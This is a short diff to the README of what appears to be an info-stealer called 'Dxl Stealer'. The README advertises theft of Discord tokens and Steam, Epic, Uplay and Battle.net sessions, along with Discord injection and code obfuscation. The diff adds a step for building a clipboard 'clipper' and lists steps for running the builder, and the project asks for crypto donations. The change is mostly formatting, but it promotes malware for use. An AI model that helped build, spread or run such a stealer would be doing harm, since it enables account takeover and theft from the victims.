@@ -40,7 +40,7 @@
     • Obfuscated Code.
     • Discord Injection.
     • Discord Tokens.
-    •Steam Session.
+    • Steam Session.
     • Epic Session.
     • Uplay Session.
     • Battle.net Session
@@ -108,6 +108,8 @@
 3. Dowload Dxl Stealer.
 4. Click Dxl clipper builder.
 5. Double click install.py and Builder.py run.
+4. build [clipper.py]
+
 ## Support the Project
 
 If you find this project useful and would like to show your support, you can make a donation using the following cryptocurrencies:
